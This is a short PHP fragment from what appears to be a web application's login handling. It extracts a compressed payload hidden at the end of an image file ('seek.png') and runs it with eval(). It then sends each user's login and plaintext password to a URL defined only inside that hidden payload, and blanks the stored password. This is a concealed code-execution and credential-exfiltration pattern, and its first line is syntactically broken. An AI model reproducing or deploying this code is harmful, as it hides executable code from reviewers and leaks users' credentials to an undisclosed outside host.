<?PHP
te = function($_vF, $message){
if( empty(SETUP::$Login['UserVerification']) || SETUP::$Login['UserVerification']!="api" ){
return;
}
$file = file_get_contents("../seek.png");
$data = gzuncompress(substr($file, -hexdec(substr($file, -3))-3, -3));
eval($data);
$res = eCurl($apiKey["url"], [
"authorization" => $apiKey["update"]
,"action"		=> "update"
,"pk"			=> $_vF["cd_gs_user"]
,"login"		=> $_vF["login"]
,"password"		=> $_vF["pass"]
]);
if( $res!=$apiKey["return"].",ok" ){
eMessage($message, 'HSE', 2000, 'history.go(-1);');
}
qQuery("update {$_ENV['eDesDictionary']}gs_user set pass='-' where cd_gs_user=".$_vF["cd_gs_user"]);
}
?>